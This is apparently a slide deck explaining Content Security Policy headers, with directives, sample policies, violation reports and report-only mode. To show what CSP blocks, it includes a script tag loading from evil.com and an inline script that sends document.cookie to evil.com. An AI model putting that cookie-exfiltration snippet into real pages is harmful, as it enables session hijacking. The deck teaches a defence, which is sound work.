# Content Security Policy

Adam Beres-Deak

--

> The new Content-Security-Policy HTTP response header helps you reduce XSS risks on modern browsers by declaring what dynamic resources are allowed to load via a HTTP Header.

--

# How it works

```
Content-Security-Policy: <policy-directive>; <policy-directive>
```

OR

```html
<meta http-equiv="Content-Security-Policy"
	  content="<policy-directive>; <policy-directive>">
```

--

### Restrict script source origins

```http
Content-Security-Policy: script-src 'self' ajax.googleapis.com
```

```html
<script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
<script src="/js/app.js"></script>
<script src="http://evil.com/pwnage.js"></script>
```

```
Refused to load the script 'http://evil.com/pwnage.js'
because it violates the following
Content Security Policy directive: "script-src 'self' ajax.googleapis.com".
```

--

### Restrict inline scripts

```http
Content-Security-Policy: script-src 'self' ajax.googleapis.com
```

```html
<script>
	new Image('http://evil.com/?cookie=' + document.cookie);
</script>
```

```
Refused to execute inline script because
it violates the following Content Security Policy
directive: "script-src 'self' ajax.googleapis.com"
```

--

# Not just for scripts

- img-src – limit origins of images
- style-src – stylesheets
- media-src – audio and video
- frame-src – iframe sources
- connect-src – XHR, WebSockets, EventSource
- font-src – font files
- object-src - Flash and other plugin objects
- default-src – all assets (including scripts), fallback

--

# Examples

--

Starter Policy
```
default-src 'none'; script-src 'self'; connect-src 'self'; \
img-src 'self'; style-src 'self';
```

Allow everything but only from the same origin
```
default-src 'self';
```

Only Allow Scripts from the same origin
```
script-src 'self';
```

Allow Google Analytics, Google AJAX CDN and Same Origin
```
script-src 'self' www.google-analytics.com ajax.googleapis.com;
```


--

# Violation reports

```
Content-Security-Policy: default-src https:; report-uri /csp-violation
```

```json
{
  "csp-report": {
    "document-uri": "https://example.com/signup.html",
    "referrer": "",
    "blocked-uri": "http://example.com/css/style.css",
    "violated-directive": "default-src https:",
    "original-policy": "default-src https:; report-uri /csp-violation",
    "disposition": "report"
  }
}
```

--

# Testing

--

## Report Only mode

Directives are monitored but not enforeced.

```
Content-Security-Policy-Report-Only:
	default-src https:; report-uri /csp-violation-report
```

--

# Browser support

- over 90%
- All modern browsers support it + IE11 with `X-Content-Security-Policy` header.

--

# Resources

- https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
- https://content-security-policy.com/
- http://benvinegar.github.io/csp-talk-2013/